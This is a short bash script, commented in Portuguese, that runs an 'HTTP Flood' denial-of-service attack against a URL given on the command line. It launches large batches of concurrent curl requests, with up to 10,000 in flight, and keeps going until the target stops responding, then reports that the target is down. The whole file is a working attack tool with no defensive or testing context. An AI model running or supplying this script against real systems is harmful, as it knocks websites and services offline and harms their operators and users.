#!/usr/bin/env bash

url="$1"
reqs="$2"

echo "[*] Iniciando ataque HTTP Flood contra $url com $reqs requisições por segundo..."

target_checking() {
	status_code=$(curl -o /dev/null -s -w "%{http_code}" --connect-timeout 2 "$url")
	if [[ "$status_code" =~ ^(000|4..|5..)$ ]]; then
		# Retorna erro se for código 000 (offline) ou erros HTTP (4xx, 5xx)
		return 1
	fi
	return 0
}

active_process=0

while target_checking; do
	for i in $(seq 1 $reqs); do
		if ((active_process >= 10000)); then
			wait -n
			((active_process--))
		fi
		curl -s -o /dev/null "$url" &
		((active_process++))
	done

	# sleep 0.5
done

echo "[!] O alvo não está mais respondendo."

exit 0
